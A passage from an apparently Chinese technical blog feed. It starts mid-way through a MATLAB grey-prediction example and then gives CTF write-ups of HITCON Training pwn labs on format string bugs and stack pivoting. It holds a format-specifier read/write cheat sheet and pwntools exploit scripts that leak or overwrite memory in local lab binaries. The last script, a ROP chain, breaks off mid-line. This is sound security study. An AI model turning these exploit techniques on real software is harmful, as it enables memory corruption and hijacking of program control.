operator">=</span><span class="token function">ys1</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">:</span>n1<span class="token operator">+</span>t_test1<span class="token punctuation">)</span><span class="token punctuation">;</span>det1<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">2</span><span class="token operator">:</span>n1    det1<span class="token operator">=</span>det1<span class="token operator">+</span><span class="token function">abs</span><span class="token punctuation">(</span><span class="token function">yn1</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token function">y1</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span>det1<span class="token operator">=</span>det1<span class="token operator">/</span><span class="token punctuation">(</span>n1<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">subplot</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">plot</span><span class="token punctuation">(</span>x1<span class="token punctuation">,</span>y1<span class="token punctuation">,</span><span class="token string">'^r-'</span><span class="token punctuation">,</span>xs1<span class="token punctuation">,</span>yn1<span class="token punctuation">,</span><span class="token string">'b-o'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">title</span><span class="token punctuation">(</span><span class="token string">'单调递增'</span> <span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">legend</span><span class="token punctuation">(</span><span class="token string">'实测值'</span><span class="token punctuation">,</span><span class="token string">'预测值'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">disp</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'百分绝对误差为：'</span><span class="token punctuation">,</span><span class="token function">num2str</span><span class="token punctuation">(</span>det1<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'%'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">disp</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'预测值为： '</span><span class="token punctuation">,</span><span class="token function">num2str</span><span class="token punctuation">(</span><span class="token function">ys1</span><span class="token punctuation">(</span>n1<span class="token operator">+</span><span class="token number">1</span><span class="token operator">:</span>n1<span class="token operator">+</span>t_test1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">%整个区间</span>y2<span class="token operator">=</span><span class="token function">sin</span><span class="token punctuation">(</span><span class="token keyword">pi</span><span class="token operator">*</span>x2<span class="token operator">/</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>n2<span class="token operator">=</span><span class="token function">length</span><span class="token punctuation">(</span>y2<span class="token punctuation">)</span><span class="token punctuation">;</span>yy2<span class="token operator">=</span><span class="token function">ones</span><span class="token punctuation">(</span>n2<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">yy2</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">y2</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">2</span><span class="token operator">:</span>n2    <span class="token function">yy2</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">yy2</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">y2</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span>B2<span class="token operator">=</span><span class="token function">ones</span><span class="token punctuation">(</span>n2<span class="token number">-1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token punctuation">(</span>n2<span class="token number">-1</span><span class="token punctuation">)</span>    <span class="token function">B2</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token function">yy2</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">yy2</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span>    <span class="token function">B2</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">end</span>BT2<span class="token operator">=</span>B2<span class="token operator">'</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>n2<span class="token number">-1</span>    <span class="token function">YN2</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">y2</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span>YN2<span class="token operator">=</span>YN2<span class="token operator">'</span><span class="token punctuation">;</span>A2<span class="token operator">=</span><span class="token function">inv</span><span class="token punctuation">(</span>BT2<span class="token operator">*</span>B2<span class="token punctuation">)</span><span class="token operator">*</span>BT2<span class="token operator">*</span>YN2<span class="token punctuation">;</span>a2<span class="token operator">=</span><span class="token function">A2</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>u2<span class="token operator">=</span><span class="token function">A2</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>t2<span class="token operator">=</span>u2<span class="token operator">/</span>a2<span class="token punctuation">;</span>t_test2<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">%需要预测个数</span><span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>t_test2<span class="token operator">+</span>n2<span class="token punctuation">;</span><span class="token function">yys2</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token function">y2</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">-</span>t2<span class="token punctuation">)</span><span class="token operator">.*</span><span class="token function">exp</span><span class="token punctuation">(</span><span class="token operator">-</span>a2<span class="token operator">.*</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token operator">+</span>t2<span class="token punctuation">;</span><span class="token function">yys2</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">y2</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span>n2<span class="token operator">+</span>t_test2<span class="token operator">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">2</span>    <span class="token function">ys2</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">yys2</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token function">yys2</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span>x22<span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>n2<span class="token punctuation">;</span>xs2<span class="token operator">=</span><span class="token number">2</span><span class="token operator">:</span>n2<span class="token operator">+</span>t_test2<span class="token punctuation">;</span>yn2<span class="token operator">=</span><span class="token function">ys2</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">:</span>n2<span class="token operator">+</span>t_test2<span class="token punctuation">)</span><span class="token punctuation">;</span>det2<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">2</span><span class="token operator">:</span>n2    det2<span class="token operator">=</span>det2<span class="token operator">+</span><span class="token function">abs</span><span class="token punctuation">(</span><span class="token function">yn2</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token function">y2</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span>det2<span class="token operator">=</span>det2<span class="token operator">/</span><span class="token punctuation">(</span>n2<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">subplot</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">plot</span><span class="token punctuation">(</span>x2<span class="token punctuation">,</span>y2<span class="token punctuation">,</span><span class="token string">'^r-'</span><span class="token punctuation">,</span>xs2<span class="token punctuation">,</span>yn2<span class="token punctuation">,</span><span class="token string">'b-o'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">title</span><span class="token punctuation">(</span><span class="token string">'全区间'</span> <span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">legend</span><span class="token punctuation">(</span><span class="token string">'实测值'</span><span class="token punctuation">,</span><span class="token string">'预测值'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">disp</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'百分绝对误差为：'</span><span class="token punctuation">,</span><span class="token function">num2str</span><span class="token punctuation">(</span>det2<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'%'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">disp</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'预测值为： '</span><span class="token punctuation">,</span><span class="token function">num2str</span><span class="token punctuation">(</span><span class="token function">ys2</span><span class="token punctuation">(</span>n2<span class="token operator">+</span><span class="token number">1</span><span class="token operator">:</span>n2<span class="token operator">+</span>t_test2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>原运行效果：</p><p><img src="https://i.loli.net/2018/11/02/5bdb9e4f895b1.png" alt=""></p><p>将函数改为 y = sin(x) 后发现预测效果不大，这是因为灰色预测比较适用于单调函数而非波动性比较大的函数，因为这种波动会被视为干扰消除。</p><p><img src="https://i.loli.net/2018/11/02/5bdb9e005249b.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 算法 </tag>
            
            <tag> 数学模型 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Pwn-10月26-Hitcon-四</title>
      <link href="/2018/10/26/Pwn-10%E6%9C%8826-Hitcon-%E5%9B%9B/"/>
      <url>/2018/10/26/Pwn-10%E6%9C%8826-Hitcon-%E5%9B%9B/</url>
      
        <content type="html"><![CDATA[<p>……</p><a id="more"></a><h1 id="Pwn-10月26-Hitcon-四"><a href="#Pwn-10月26-Hitcon-四" class="headerlink" title="Pwn-10月26-Hitcon-四"></a>Pwn-10月26-Hitcon-四</h1><blockquote><p>练习Hitcon的第四天🐷，愉快地学习fsb（Format string bug），格式化字符串漏洞。</p></blockquote><h2 id="lab7-crack"><a href="#lab7-crack" class="headerlink" title="lab7-crack"></a>lab7-crack</h2><blockquote><p>好👍，这题开始接触格式化字符串漏洞。</p><p>什么是格式化字符串漏洞？我们知道c/c++中<code>printf</code>函数输出值需要对应的参数，但当提供的参数出现问题，或者没有提供参数的时候，格式化字符串漏洞就可能出现了。<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_intro/#_6" target="_blank" rel="noopener">CTF-wiki传送门</a></p><p>那么假设，此时我们在编写程序时候，写成了下面的样子</p><pre><code>printf(&quot;Color %s, Number %d, Float %4.2f&quot;);</code></pre><p>此时我们可以发现我们并没有提供参数，那么程序会如何运行呢？程序照样会运行，会将栈上存储格式化字符串地址上面的三个变量分别解析为</p><ol><li><strong>解析其地址对应的字符串</strong></li><li>解析其内容对应的整形值</li><li>解析其内容对应的浮点值</li></ol><p>由此可见<a href="http://www.cnblogs.com/Ox9A82/p/5429099.html" target="_blank" rel="noopener">格式化字符串漏洞</a>主要是：</p><ul><li><p><strong>1.泄漏任意地址的值，leak内存（比如leak出libc基地址）</strong></p></li><li><p><strong>2.写任意地址，可用于修改got表</strong></p></li></ul></blockquote><pre class=" language-bash"><code class="language-bash">这部分来自icemakr的博客 <span class="token operator">==</span><span class="token operator">></span>向大佬致敬32位读<span class="token string">'%{}<span class="token variable">$x</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>           // 读4个字节<span class="token string">'%{}<span class="token variable">$p</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>           // 同上面<span class="token string">'${}<span class="token variable">$s</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>写<span class="token string">'%{}<span class="token variable">$n</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>           // 解引用，写入四个字节<span class="token string">'%{}<span class="token variable">$hn</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>          // 解引用，写入两个字节<span class="token string">'%{}<span class="token variable">$hhn</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>         // 解引用，写入一个字节<span class="token string">'%{}<span class="token variable">$lln</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>         // 解引用，写入八个字节64位读<span class="token string">'%{}<span class="token variable">$x</span>'</span>.format<span class="token punctuation">(</span>index, num<span class="token punctuation">)</span>      // 读4个字节<span class="token string">'%{}<span class="token variable">$lx</span>'</span>.format<span class="token punctuation">(</span>index, num<span class="token punctuation">)</span>     // 读8个字节<span class="token string">'%{}<span class="token variable">$p</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>           // 读8个字节<span class="token string">'${}<span class="token variable">$s</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>写<span class="token string">'%{}<span class="token variable">$n</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>           // 解引用，写入四个字节<span class="token string">'%{}<span class="token variable">$hn</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>          // 解引用，写入两个字节<span class="token string">'%{}<span class="token variable">$hhn</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>         // 解引用，写入一个字节<span class="token string">'%{}<span class="token variable">$lln</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>         // 解引用，写入八个字节%1<span class="token variable">$lx</span><span class="token keyword">:</span> RSI%2<span class="token variable">$lx</span><span class="token keyword">:</span> RDX%3<span class="token variable">$lx</span><span class="token keyword">:</span> RCX%4<span class="token variable">$lx</span><span class="token keyword">:</span> R8%5<span class="token variable">$lx</span><span class="token keyword">:</span> R9%6<span class="token variable">$lx</span><span class="token keyword">:</span> 栈上的第一个QWORD</code></pre><h3 id="检查保护措施"><a href="#检查保护措施" class="headerlink" title="检查保护措施"></a>检查保护措施</h3><blockquote><p>按套路来，先<code>checksec crack</code>:</p><p><img src="https://i.loli.net/2018/10/26/5bd2aa6e80564.png" alt=""></p><p>可以看到开启了栈溢出保护(canary found)，以及栈不可执行(NX)措施，很明显让我们从别处入手。</p><p>简单运行一下：</p><p><img src="https://i.loli.net/2018/10/26/5bd2aacec0ef5.png" alt=""></p><p>我们需要输入两个值，一个是name，输入之后会被打印，一个是password。</p><p><a href="http://m4x.fun/post/hitcon-training-writeup/#lab7-crack" target="_blank" rel="noopener">m4x师傅</a>的逻辑：<code>输出 name 时有明显的格式化字符串漏洞，这个题的思路有很多，可以利用 fsb 改写 password，或者 leak 出 password，也可以直接通过 fsb，hijack puts_got 到 system(“cat flag”) 处（注意这里 printf 实际调用了 puts）</code>。</p></blockquote><h3 id="逻辑分析"><a href="#逻辑分析" class="headerlink" title="逻辑分析"></a>逻辑分析</h3><blockquote><p>idapro启动！！启动！！给我启动啊！！🙃！main函数：</p><p><img src="https://i.loli.net/2018/10/26/5bd2ac48e9124.png" alt=""></p></blockquote><h4 id="exp1：通过格式化字符串漏洞泄露password"><a href="#exp1：通过格式化字符串漏洞泄露password" class="headerlink" title="exp1：通过格式化字符串漏洞泄露password"></a>exp1：通过格式化字符串漏洞泄露password</h4><blockquote><p><img src="https://i.loli.net/2018/10/26/5bd2b96d60a25.png" alt=""></p><p>简单测试一下我们可以看到一些有趣的东西，这些应该是<code>printf</code>栈中的数据，那么我们只要找到栈中存储我们输入的内容的位置，假如输入的是某地址，再用%s解析就可获得该地址下的内容：</p><p><img src="https://i.loli.net/2018/10/26/5bd2bb34567e1.png" alt=""></p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/26/5bd2c986ab76f.png" class="lazyload"></p><p>可以看到输入的内容在栈中的第十个位置，至于为什么在gdb看栈中数据在第十一个位置，是因为”Hello ,”还没有被输出，待其输出后我们的输入就来到了第十个位置。</p><p>这里学到一个小知识，<code>%10$s</code>中格式化字符串的“$”操作符，其允许我们从格式化字符串中选取一个位置的参数作为特定的参数。我们可以从IDA中得到<code>password_addr=0x804A080</code>，然后构造EXP。</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> libnum <span class="token keyword">import</span> n2scontext<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./crack'</span><span class="token punctuation">)</span>pwd_addr<span class="token operator">=</span> <span class="token number">0x804A048</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">' ?'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p32<span class="token punctuation">(</span>pwd_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"|%10$x||"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'|'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#drop = True 表示丢弃pattern，不接受pattern</span>pwd <span class="token operator">=</span> str<span class="token punctuation">(</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'||'</span><span class="token punctuation">,</span>drop <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">" :"</span><span class="token punctuation">,</span>pwd<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>运行效果：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/26/5bd2bd871ce46.png" class="lazyload"></p><h4 id="exp2：修改随机数"><a href="#exp2：修改随机数" class="headerlink" title="exp2：修改随机数"></a>exp2：修改随机数</h4><blockquote><p>简单了解fmtstr之后，知道原来还有这么骚的pwntools模块，这里简单对这个exp做个分析理解。</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#来自Veritas501大佬的exp</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>cn <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./crack'</span><span class="token punctuation">)</span>p_pwd <span class="token operator">=</span> <span class="token number">0x0804A048</span>fmt_len <span class="token operator">=</span> <span class="token number">10</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>pay <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span>fmt_len<span class="token punctuation">,</span><span class="token punctuation">{</span>p_pwd<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">)</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>运行效果:</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/26/5bd2c4a2645c3.png" class="lazyload"></p><h2 id="lab8-craxme"><a href="#lab8-craxme" class="headerlink" title="lab8-craxme"></a>lab8-craxme</h2><blockquote><p>这也是一题格式化字符串漏洞😄，我们可以直接通过类似上面题exp2的方式来修改值达到目的。</p></blockquote><h3 id="检查保护措施-1"><a href="#检查保护措施-1" class="headerlink" title="检查保护措施"></a>检查保护措施</h3><blockquote><p><code>checksec craxme</code>:</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/26/5bd2cbf09c0e6.png" class="lazyload"></p><p>可以看到几乎所有保护措施都打开，无法通过栈溢出或者栈执行等漏洞进行攻击。</p></blockquote><h3 id="逻辑分析-1"><a href="#逻辑分析-1" class="headerlink" title="逻辑分析"></a>逻辑分析</h3><blockquote><p>像lab7一样，我们可以在ida里面看到有格式化字符串漏洞：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/26/5bd2cc3c37cec.png" class="lazyload"></p><p>我们可以运行一下试试</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/26/5bd2cb30efb76.png" class="lazyload"></p><p>可以看到在printf函数栈中第七个位置是我们输入的内容，那么我们就可利用pwntools的fmtstr_payload来改变magic的值。</p><p>通过ida找到magic的地址：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/26/5bd2cd771b79f.png" class="lazyload"></p><p>通过Pwntools.ELF:</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/26/5bd2ce6d80f25.png" class="lazyload"></p></blockquote><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>magicAddr <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./craxme"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"magic"</span><span class="token punctuation">]</span>inputs <span class="token operator">=</span> int<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token string">"[+]1.flag\n[+]2.craxflag\ninput:"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> inputs <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>magicAddr<span class="token punctuation">:</span> <span class="token number">0xda</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>magicAddr<span class="token punctuation">:</span> <span class="token number">0xfaceb00c</span><span class="token punctuation">}</span><span class="token punctuation">)</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./craxme"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">" :"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>运行效果：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/26/5bd2cfce6cf83.png" class="lazyload"></p><blockquote><p>今天的格式化字符串漏洞就学到这儿啦，难受😭。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> 二进制安全 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Pwn-10月25-Hitcon(三)</title>
      <link href="/2018/10/25/Pwn-10%E6%9C%8825-Hitcon-%E4%B8%89/"/>
      <url>/2018/10/25/Pwn-10%E6%9C%8825-Hitcon-%E4%B8%89/</url>
      
        <content type="html"><![CDATA[<p>……</p><a id="more"></a><h1 id="Pwn-10月25-Hitcon-三"><a href="#Pwn-10月25-Hitcon-三" class="headerlink" title="Pwn-10月25-Hitcon(三)"></a>Pwn-10月25-Hitcon(三)</h1><blockquote><p>一天一天慢慢来，😭</p></blockquote><h2 id="lab6-migration"><a href="#lab6-migration" class="headerlink" title="lab6-migration"></a>lab6-migration</h2><blockquote><p>这个题目涉及到栈迁移(stack-pivot)，在<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/stackoverflow/others/#stack-pivoting" target="_blank" rel="noopener">ctf-wiki</a>上面是有这个例题和解释的。</p><blockquote><p>该技巧就是劫持栈指针指向攻击者所能控制的内存处，然后再在相应的位置进行 ROP。一般来说，我们可能在以下情况需要使用 stack pivoting</p><ul><li>可以控制的栈溢出的字节数较少，难以构造较长的 ROP 链</li><li>开启了 PIE 保护，栈地址未知，我们可以将栈劫持到已知的区域。</li><li>其它漏洞难以利用，我们需要进行转换，比如说将栈劫持到堆空间，从而在堆上写 rop 及进行堆漏洞利用</li></ul><p>此外，利用 stack pivoting 有以下几个要求:</p><ul><li>可以控制程序执行流。</li><li>可以控制 sp 指针。一般来说，控制栈指针会使用 ROP，常见的控制栈指针的 gadgets 一般是</li></ul><pre class=" language-assembly"><code class="language-assembly">pop rsp/esp</code></pre></blockquote><p>在这题中，溢出长度不够导致无法一次性构造ropchain，并且还限制了main函数溢出的次数。</p></blockquote><h3 id="检查保护措施"><a href="#检查保护措施" class="headerlink" title="检查保护措施"></a>检查保护措施</h3><blockquote><p><code>checksec migration</code></p><p><img src="https://i.loli.net/2018/10/25/5bd172b663166.png" alt=""></p><p>开启了NX。</p></blockquote><h3 id="逻辑分析"><a href="#逻辑分析" class="headerlink" title="逻辑分析"></a>逻辑分析</h3><blockquote><p>ida 里面看一看：</p><p><img src="https://i.loli.net/2018/10/25/5bd1738bc3bfe.png" alt=""></p><p>buf大小为0x28 = 40字节，而read读取0x40 = 64字节</p><p>gdb跑一下，看看具体情况：</p><p><img src="https://i.loli.net/2018/10/25/5bd17674836d1.png" alt=""></p><p>也就是说有4个字节被读取到EBP中，剩下20个溢出字节可以用来构造ropchain。</p><p>搜索一下可用的gadget：</p><p><img src="https://i.loli.net/2018/10/25/5bd18186ce41f.png" alt=""></p></blockquote><h3 id="构造exp"><a href="#构造exp" class="headerlink" title="构造exp"></a>构造exp</h3><p>exp：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token comment" spellcheck="true"># -*- coding:utf-8 -*-S</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./migration'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./migration"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/i386-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>system_libc <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"system_libc:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>system_libc<span class="token punctuation">)</span>read_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"read_plt:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token keyword">print</span> 